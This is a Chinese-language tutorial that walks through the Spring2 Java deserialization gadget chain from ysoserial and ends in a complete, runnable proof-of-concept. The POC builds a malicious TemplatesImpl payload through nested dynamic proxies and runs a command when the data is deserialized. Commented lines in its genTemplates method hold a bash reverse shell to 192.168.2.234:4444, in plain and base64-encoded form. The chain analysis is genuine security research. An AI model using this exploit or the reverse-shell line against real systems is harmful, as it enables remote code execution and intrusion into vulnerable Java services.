Spring2和Spring1的区别点只在于最终触发`TemplatesImpl`的那个类不同，其他地方都是一样的，所以我这里的前边段会缝合Spring1前边的内容。这样即使你从本篇文章(Spring2)开始阅读，也不会有割裂感。

## 环境准备

JDK应使用JDK version < 8u73，我这里使用的是JDK 8u66，这是因为该攻击链使用了`sun.reflect.annotation.AnnotationInvocationHandler`。

```xml
<!-- https://mvnrepository.com/artifact/org.springframework/spring-core -->
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>4.1.4.RELEASE</version>
</dependency>
<!-- https://mvnrepository.com/artifact/org.springframework/spring-aop -->
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-aop</artifactId>
    <version>4.1.4.RELEASE</version>
</dependency>
```

这个攻击链是比较绕的，这是因为其中使用了多层动态代理来完成方法调用。动态代理的一般用法是先有一个入口类，当入口类和恶意代码触发类有偏差时(链无法以直接形式触发)，可以通过动态代理间接触发。

这里的先后关系是，需要先找到一个入口类，同时我知道恶意代码类的触发类(`TemplatesImpl`)，然后从入口类再去找可利用的类。这个链肯定也是这么挖出来的，所以在本篇文章的代码分析中，会以入口点入手来分析对应的过程。

在分析此攻击链之前，你需要对`TemplatesImpl`这个类比较了解才行，如果你还并不是很了解的话可以直接阅读我的这篇文章[详解TemplatesImpl](../详解TemplatesImpl/main.md)

如果你对`TemplatesImpl`类比较了解，便知道，当`TemplatesImpl`中的字段被构造为恶意代码时，然后触发`getOutputProperties`或`newTransformer`这两个方法中的任意一个即可导致恶意代码执行。

在这个攻击链就是通过Spring中的某些类来完成触发这两个方法的。

## 代码分析 - 正向

Spring 核心包中的 `org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider` 类实现了 `TypeProvider` 接口，并且是一个可被反序列化的类。

这个类中的代码是这样的：

```java
static class MethodInvokeTypeProvider implements TypeProvider {

    private final TypeProvider provider;

    private final String methodName;

    private final int index;

    private transient Object result;

    public MethodInvokeTypeProvider(TypeProvider provider, Method method, int index) {
        this.provider = provider;
        this.methodName = method.getName();
        this.index = index;
        this.result = ReflectionUtils.invokeMethod(method, provider.getType());
    }

    @Override
    public Type getType() {
        if (this.result instanceof Type || this.result == null) {
            return (Type) this.result;
        }
        return ((Type[])this.result)[this.index];
    }

    @Override
    public Object getSource() {
        return null;
    }
	// 反序列化方法
    private void readObject(ObjectInputStream inputStream) throws ...... {
        // 反序列化恢复默认字段值，(恢复序列化时的provider、methodName、index字段)
        inputStream.defaultReadObject();
        // 从TypeProvider.getType() 中搜索一个叫做 methodName 这个方法名的方法
        // 假设methodName的值为：getOutputProperties，这个就是我们想要调用的方法
        // 那么就是从TypeProvider中搜索getOutputProperties方法
        Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);
        // 调用provider.getType()中的method方法
        this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());
    }
}
```

请先阅读我在`readObject`中留的注释，这样才方便后续的理解......

那么如果我们能让`this.provider.getType()`的结果是一个`TemplatesImpl`对象，那么通过`ReflectionUtils.invokeMethod("getOutputProperties", TemplatesImpl)`即可触发恶意代码。

在构造之前，我们得先知道`this.provider.getType()`返回回来的是个什么东西。

该方法的接口定义如下：

```java
static interface TypeProvider extends Serializable {

    /**
     * Return the (possibly non {@link Serializable}) {@link Type}.
     */
    Type getType();

    /**
     * Return the source of the type or {@code null}.
     */
    Object getSource();
}
```

如果我们想让`getType()`方法执行之后能得到一个`TemplatesImpl`对象。这几乎是不可能的，而Spring2链的挖掘者提供了一种动态代理思路来完成这个构造。

我们需要代理一个`TypeProvider`接口的一个动态代理实现，如果触发这个动态代理的`getType`方法之后能返回一个`TemplatesImpl`对象。

此时，我们可以先按照这个思路构造这样的一段残缺的POC出来了。

```java
public static void main(String[] args) throws Exception {
    // -----------------关注的重点在这儿------------------
    Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
    // 此时我们的xxxxxxx还不知道怎么构建
    Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, xxxxxxxxx);


    // -----------------这段代码只是为了创建MethodInvokeTypeProvider实例-------------------
    Class<?> methodInvokeTypeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
    Constructor<?> mitpCtor = methodInvokeTypeProvider.getDeclaredConstructors()[0];
    mitpCtor.setAccessible(true);
    // 把构建好的动态代理传给MethodInvokeTypeProvider内部的provider属性
    final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
    final Field field = mitp.getClass().getDeclaredField("methodName");
    field.setAccessible(true);
    field.set(mitp, "getOutputProperties");
}
```

这样`provider`属性就是一个看起来实现了`TypeProvider`接口的类了，你可以认为他具备了`getType`接口了 。

然后我们开始构建`xxxxxxxxx`这一段。

我们想`xxxxxxxxx`这个类有一个`getType`方法，同时这个`getType`方法能返回一个`TemplatesImpl`对象。

还是找不到对不对！Spring2的链的作者给的这么做的，使用动态代理类：`sun.reflect.annotation.AnnotationInvocationHandler`，这个动态代理类中的代码是这么构造的：

![image-20250115211252451](./main.assets/image-20250115211252451.png)

这个类什么意思呢？

就是构造一个这个类(`sun.reflect.annotation.AnnotationInvocationHandler`)的动态代理对象，假如我要调用这个类的`getType`方法，那么就会触发动态代理对象中的`invoke`方法，此时`invoke`方法中的`Method`这个类型的参数的值就是 `getType`，然后从`this.memeberValues`这个`getType`对应的Object。

所以我们接着在原来残缺的POC上进行构造：

```java
public static void main(String[] args) throws Exception {

    // 因为AnnotationInvocationHandler是一个注解，所以无法通过正常方式new出来
    // 这里是使用反射的方式来进行创建
    Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> aihCtor = annotationInvocationHandler.getDeclaredConstructors()[0];
    aihCtor.setAccessible(true);

    Map<String, Object> map = new HashMap<>();
    // 此时我们往这个map塞入一个键为 getType的 xxxxxxxxxx
    // 就能使得在触发动态代理的getType方法时能够返回xxxxxxxxxx这个Object
    // 但此时我们还不知道xxxxxxxxxx该怎么构造
    map.put("getType", xxxxxxxxxx);
    InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
    Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
    Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);


    // -----------------下边的这段代码就不用关注了-----------------
    Class<?> methodInvokeTypeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
    Constructor<?> mitpCtor = methodInvokeTypeProvider.getDeclaredConstructors()[0];
    mitpCtor.setAccessible(true);
    // 把构建好的动态代理传给MethodInvokeTypeProvider内部的provider属性
    final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
    final Field field = mitp.getClass().getDeclaredField("methodName");
    field.setAccessible(true);
    field.set(mitp, "getOutputProperties");
}
```

在上边的这份代码中就能让`MethodInvokeTypeProvider`中的`this.provider.getType()`方法了，但是还没有完。

因为`getType()`方法返回的是一个`Type`接口，我们直接把`TemplatesImpl`塞进去是不行的，因为`TemplatesImpl`无法被转换为`Type`接口。

所以现在我们希望一个类既实现了`Type`又实现了`Templates`接口（`getOutputProperties`和`newTransformer`方法都被定义在这个接口中），但很显然这是不可能的。（为什么这里还要实现`Templates`接口呢？这是因为在`MethodInvokeTypeProvider`中我们需要调用这个类的`getOutputProperties`或者`newTransformer`方法

这个问题通过动态代理还是可以解决，我们通过动态代理代理这两个接口就行了。

然后我们继续在上边的残缺POC上加入一个代理了两个接口的动态代理：

```java
public static void main(String[] args) throws Exception {
    // 按理来说，这里的xxxxxxxxxx如果能塞进来一个TemplatesImpl对象，此时我们就能完成攻击链的构造了
    // 很不巧，newProxyInstance的第三个参数是一个必须要实现InvocationHandler接口的动态代理实现类
    // 而TemplatesImpl对象是没有实现这个接口的
    Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{Type.class, Templates.class}, xxxxxxxxxx);

    Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> aihCtor = annotationInvocationHandler.getDeclaredConstructors()[0];
    aihCtor.setAccessible(true);

    Map<String, Object> map = new HashMap<>();
    // 此时map中的Object就是我们实现了Type和Templates这两个接口的实例了
    map.put("getType", typeTemplatesProxy);
    InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
    Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
    Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);


    // -----------------下边的这段代码就不用关注了-----------------
    Class<?> methodInvokeTypeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
    Constructor<?> mitpCtor = methodInvokeTypeProvider.getDeclaredConstructors()[0];
    mitpCtor.setAccessible(true);
    // 把构建好的动态代理传给MethodInvokeTypeProvider内部的provider属性
    final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
    final Field field = mitp.getClass().getDeclaredField("methodName");
    field.setAccessible(true);
    field.set(mitp, "getOutputProperties");
}
```

虽然我们还不知道`xxxxxxxxxx`中的代码应该怎么构建。但即便如此，我们给`xxxxxxxxxx`随便赋一个实现了`InvocationHandler`的类就能满足`Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);`这行代码中的需求。

但是后边还有一个关键的一步，就是`ReflectionUtils.invokeMethod(method, this.provider.getType());`

我们看一下`ReflectionUtils.invokeMethod`这个方法是怎么实现的。

![image-20250115222707639](./main.assets/image-20250115222707639.png)

OK，然后开始寻找实现了`InvocationHandler`接口的实现类了。

再回头一开始我们构建的残缺POC中。为了构建`xxxxxxxxxx`中的一个代理类，Spring2的作者找到了一个实现了`InvocationHandler`的类 `org.springframework.aop.framework.JdkDynamicAopProxy`，同时这个类的好处是刚好可以让我们用来封装`TemplatesImpl`类。

让我们看一下这个类中的关键逻辑，我们知道上一步会触发到这个类中的invoke方法，所以最好的方法是从invoke方法中进行跟踪。

```java
final class JdkDynamicAopProxy implements AopProxy, InvocationHandler, Serializable {
	private static final long serialVersionUID = 5531744639992436476L;
	private final AdvisedSupport advised;
	private boolean equalsDefined;
	private boolean hashCodeDefined;
    
    // 重要的参数如下：
    // method == getOutputProperties
    // args == 空参 == new Object[0]
	@Override
	public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
		MethodInvocation invocation;
		Object oldProxy = null;
		boolean setProxyContext = false;
		// 从this.advised这个类中取出targetSource类
		TargetSource targetSource = this.advised.targetSource;
		Class<?> targetClass = null;
		Object target = null;

		try {
            // this.equalsDefined字段值默认为false，取反后 == true
            // AopUtils.isEqualsMethod 会判断method的name是否 == "equals"
            // 很显然不等于，所以这个if语句不会执行
			if (!this.equalsDefined && AopUtils.isEqualsMethod(method)) {
				return equals(args[0]);
			}
            // this.hashCodeDefined字段值默认为false，取反后 == true
            // AopUtils.isEqualsMethod 会判断method的name是否 == "hashCode"
            // 很显然不等于，所以这个if语句不会执行
			if (!this.hashCodeDefined && AopUtils.isHashCodeMethod(method)) {
				return hashCode();
			}
            // this.advised.opaque字段值默认为false，取反后 == true
            // method.getDeclaringClass().isInterface()会判断method是否来自于一个接口，因为method是来自Templates接口，所以 == true
            // method.getDeclaringClass().isAssignableFrom(Advised.class)会判断method是否是Advised.class的子类，但很显然不是，所以这里 == false
            // 因为最后一个条件不满足，所以这个if也是不满足的
			if (!this.advised.opaque && method.getDeclaringClass().isInterface() &&
					method.getDeclaringClass().isAssignableFrom(Advised.class)) {
				return AopUtils.invokeJoinpointUsingReflection(this.advised, method, args);
			}

			Object retVal;
			// this.advised.exposeProxy默认为false，所以这个if条件是不满足的
			if (this.advised.exposeProxy) {
				oldProxy = AopContext.setCurrentProxy(proxy);
				setProxyContext = true;
			}

			// 获取targetSource中的Target字段
			target = targetSource.getTarget();
			if (target != null) {
				targetClass = target.getClass();
			}

			// Get the interception chain for this method.
             // 简单来说这个类会从一个advised的cache中读取method，如果method没有在cache中加载过就返回一个空的List<Object>
			List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);

			// 如果上一步返回的chain是一个空的List<Object>，那么这里的条件就是为true
             // 就会进入到if语句中
			if (chain.isEmpty()) {
                // 这条语句会调用target中的method方法
                // 也就是说当target为一个TemplatesImpl对象时，则会触发TemplatesImpl对象中的getOutputProperties方法
				retVal = AopUtils.koninvokeJoinpointUsingReflection(target, method, args);
                 // ReflectionUtils.makeAccessible(method);
                 // return method.invoke(target, args);
			}
			else {
				......
			}

			......
		}
		finally {
            // ......
		}
	}
}
```

按照上边的代码分析的话，如果我们能把`target`改造成`TemplatesImpl`对象，那么直接就能getShell，OK，我们知道`target`来自于`AdvisedSupport advised`，所以我们来分析一下`AdvisedSupport`中的代码。

```java
public class AdvisedSupport extends ProxyConfig implements Advised {
    TargetSource targetSource = EMPTY_TARGET_SOURCE;
	public AdvisedSupport() {
		initMethodCache();
	}
	// OK，我们现在知道上一步中的缓存是从这里来的了，这个AdvisedSupport被创建的时候缓存中肯定没有getOutputProperties方法，所以上一步中的那个chain.isEmpty()条件一定是满足的。
    private void initMethodCache() {
    	this.methodCache = new ConcurrentHashMap<MethodCacheKey, List<Object>>(32);
	}
    // 呕吼，看起来SingletonTargetSource是TargetSource的一个实现类
    public void setTarget(Object target) {
    	setTargetSource(new SingletonTargetSource(target));
	}
    // TargetSource的Setter方法
		@Override
	public void setTargetSource(TargetSource targetSource) {
		this.targetSource = (targetSource != null ? targetSource : EMPTY_TARGET_SOURCE);
	}
    // 上一步获取的就是这个方法
    // 判断method是否在缓存中，很显然第一次调用时，返回的一定是空的List<Object>
    public List<Object> getInterceptorsAndDynamicInterceptionAdvice(Method method, Class<?> targetClass) {
        MethodCacheKey cacheKey = new MethodCacheKey(method);
        List<Object> cached = this.methodCache.get(cacheKey);
        if (cached == null) {
            cached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(
                    this, method, targetClass);
            this.methodCache.put(cacheKey, cached);
        }
        return cached;
	}
}

public class SingletonTargetSource implements TargetSource, Serializable {
	private static final long serialVersionUID = 9031246629662423738L;
	private final Object target;
    // SingletonTargetSource这个类中的target居然是一个Object类型，这就非常好办了
    // Object正好可以存储TemplatesImpl这个类，这样所有的条件就都满足了
	public SingletonTargetSource(Object target) {
		Assert.notNull(target, "Target object must not be null");
		this.target = target;
	}

	@Override
	public Class<?> getTargetClass() {
		return this.target.getClass();
	}
	// 在getTarget的时候刚好就把Object对象返回过去，这样如果target 是一个 TemplatesImpl实例
    // 那么执行 AopUtils.koninvokeJoinpointUsingReflection(target, method, args);
    // 就刚好能触发TemplatesImpl中的method方法
	@Override
	public Object getTarget() {
		return this.target;
	}
}

```

所以`SingletonTargetSource`是一个直接能直接触发`TemplatesImpl`方法的类，有了这些关键点后，我们就能构造一个完整的POC了：

```java
public static void main(String[] args) throws Exception {
    AdvisedSupport as = new AdvisedSupport();
    // 这里不止有 SingletonTargetSource 对象能触发我们想要的逻辑，我还找到了两个类，也和SingletonTargetSource的做法差不多
    // LazyInitTargetSource
    // HotSwappableTargetSource
    as.setTargetSource(new SingletonTargetSource(TemplatesImpl));
    // 创建一个JdkDynamicAopProxy类的实例，然后再创建一个动态代理，和我们上边的残缺POC的逻辑接上就可以了
    Class<?> JdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
    Constructor<?> JdkDynamicAopProxyCtor = JdkDynamicAopProxyClass.getDeclaredConstructors()[0];
    JdkDynamicAopProxyCtor.setAccessible(true);
    InvocationHandler invocationHandler = (InvocationHandler)JdkDynamicAopProxyCtor.newInstance(as);
    // 按理来说，这里的xxxxxxxxxx如果能塞进来一个TemplatesImpl对象，此时我们就能完成攻击链的构造了
    // 很不巧，newProxyInstance的第三个参数是一个必须要实现InvocationHandler接口的动态代理实现类
    // 而TemplatesImpl对象是没有实现这个接口的
    Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{Type.class, Templates.class}, invocationHandler);

    Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> aihCtor = annotationInvocationHandler.getDeclaredConstructors()[0];
    aihCtor.setAccessible(true);

    Map<String, Object> map = new HashMap<>();
    // 此时map中的Object就是我们实现了Type和Templates这两个接口的实例了
    map.put("getType", typeTemplatesProxy);
    InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
    Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
    Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);


    // -----------------下边的这段代码就不用关注了-----------------
    Class<?> methodInvokeTypeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
    Constructor<?> mitpCtor = methodInvokeTypeProvider.getDeclaredConstructors()[0];
    mitpCtor.setAccessible(true);
    // 把构建好的动态代理传给MethodInvokeTypeProvider内部的provider属性
    final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
    final Field field = mitp.getClass().getDeclaredField("methodName");
    field.setAccessible(true);
    field.set(mitp, "getOutputProperties");

    serialize(mitp);
    unSerialize();
}
```

这份POC代码已经是完整的了，但是为了验证效果，我们需要把`TemplatesImpl`进行补全，同时补全用于验证效果的序列化和反序列化方法。

## 完整POC

在经过了上边分析和POC补全过程后，于是你就得到了和ysoserial中的Spring2攻击链一样的代码，同时在最后你还找到了，让我们运行这份代码看看效果：

```java
package spring;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.SingletonTargetSource;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class Spring2 {
    private static final String serialFileName = "spring2.ser";

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = genTemplates();
        AdvisedSupport as = new AdvisedSupport();
        // new LazyInitTargetSource
        // new HotSwappableTargetSource
        as.setTargetSource(new SingletonTargetSource(templates));
        Class<?> JdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> JdkDynamicAopProxyCtor = JdkDynamicAopProxyClass.getDeclaredConstructors()[0];
        JdkDynamicAopProxyCtor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler)JdkDynamicAopProxyCtor.newInstance(as);
        // 按理来说，这里的xxxxxxxxxx如果能塞进来一个TemplatesImpl对象，此时我们就能完成攻击链的构造了
        // 很不巧，newProxyInstance的第三个参数是一个必须要实现InvocationHandler接口的动态代理实现类
        // 而TemplatesImpl对象是没有实现这个接口的
        Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{Type.class, Templates.class}, invocationHandler);

        Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aihCtor = annotationInvocationHandler.getDeclaredConstructors()[0];
        aihCtor.setAccessible(true);

        Map<String, Object> map = new HashMap<>();
        // 此时map中的Object就是我们实现了Type和Templates这两个接口的实例了
        map.put("getType", typeTemplatesProxy);
        InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
        Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);


        // -----------------下边的这段代码就不用关注了-----------------
        Class<?> methodInvokeTypeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> mitpCtor = methodInvokeTypeProvider.getDeclaredConstructors()[0];
        mitpCtor.setAccessible(true);
        // 把构建好的动态代理传给MethodInvokeTypeProvider内部的provider属性
        final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
        final Field field = mitp.getClass().getDeclaredField("methodName");
        field.setAccessible(true);
        field.set(mitp, "getOutputProperties");

        serialize(mitp);
        unSerialize();
    }

    public static void serialize(Object obj)throws Exception {
        FileOutputStream fos = new FileOutputStream(serialFileName);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        fos.close();
    }
    public static void unSerialize() throws Exception {
        // 本地模拟反序列化
        FileInputStream fis = new FileInputStream(serialFileName);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object ignore = (Object) ois.readObject();
    }
    public static TemplatesImpl genTemplates() throws Exception {
        // bash -c {echo,bash -i >& /dev/tcp/192.168.2.234/4444 0>&1}|{base64,-d}|{bash,-i}
        // bash -c {echo,<base64反弹shell>}|{base64,-d}|{bash,-i}
        // String shellcode = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMjM0LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}";
        String shellcode = "calc";
        String executeCode = "Runtime.getRuntime().exec(\"" + shellcode + "\");";
        ClassPool pool = ClassPool.getDefault();
        CtClass evil = pool.makeClass("ysoserial.Evil");
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        evil.makeClassInitializer().insertAfter(executeCode);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        evil.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        evil.setSuperclass(superC);

        final byte[] classBytes = evil.toBytecode();
        byte[][] trueclassbyte = new byte[][]{classBytes};

        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, trueclassbyte);

        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Pwnr");

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        return templates;
    }
}
```

执行完毕，计算器被弹出。

![image-20250116212930196](./main.assets/image-20250116212930196.png)

## 调用链

* ObjectInputStream.readObject()
  * SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
    * SerializableTypeWrapper.TypeProvider(Proxy).getType()
      * AnnotationInvocationHandler.invoke()
        * HashMap.get()
    * ReflectionUtils.findMethod()
    * SerializableTypeWrapper.TypeProvider(Proxy).getType()
      * AnnotationInvocationHandler.invoke()
        * HashMap.get()
    * ReflectionUtils.invokeMethod()
      * Method.invoke()
        * Templates(Proxy).newTransformer()
          * JdkDynamicAopProxy.invoke()
            * AopUtils.invokeJoinpointUsingReflection()
            * Method.invoke()
              * TemplatesImpl.getOutputProperties()
              * TemplatesImpl.newTransformer()
                * TemplatesImpl.getTransletInstance()
                * TemplatesImpl.defineTransletClasses()
                  * TemplatesImpl.TransletClassLoader.defineClass()
                    * Pwner*(Javassist-generated).Runtime.exec()
